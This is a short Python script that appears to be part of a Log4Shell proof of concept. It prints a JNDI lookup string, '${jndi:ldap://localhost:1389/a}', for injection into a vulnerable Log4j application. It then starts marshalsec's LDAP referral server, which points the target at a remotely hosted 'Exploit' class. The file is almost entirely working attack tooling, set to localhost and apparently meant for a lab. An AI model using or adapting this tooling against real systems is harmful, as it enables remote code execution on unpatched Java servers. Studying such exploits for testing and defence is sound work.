from colorama import Fore, init
import subprocess
from pathlib import Path
import os

CUR_FOLDER = Path(__file__).parent.resolve()

def ldap_server() -> None:
    userip = "localhost"
    lport = "8081"
    sendme = "${jndi:ldap://localhost:1389/a}"
    jdk_path= "path to your jdk installation"+ "/bin/java"
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://localhost:8081/#Exploit".format(userip, lport)
    subprocess.run([
        jdk_path,
        "-cp",
        os.path.join(CUR_FOLDER, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    ldap_server()

